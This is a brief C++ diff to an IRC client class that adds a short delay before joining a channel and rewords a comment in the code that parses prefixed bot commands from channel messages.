@@ -29,6 +29,7 @@ bool IRCManager::isConnected() {
 
 void IRCManager::start() {
 	connected = ircc->connect();
+	Sleep(500);
 	ircc->joinChannel(IRC_CHANNEL);
 	if(!connected) { return; }
 	hThread = this->startThread();
@@ -101,7 +102,7 @@ void parseData(IRCClient* ircc, std::string data, char IRC_CommandPrefix) {
 
 	stop = params.find_first_of(":");
 	botCommand = params.substr(stop +1, params.size() -1);
-	// If Bot command was recieved
+	// If Bot command has valid prefix
 	if(botCommand.at(0) == IRC_CommandPrefix) {
 		// Remove special char
 		botCommand = botCommand.substr(1, botCommand.size() -1);
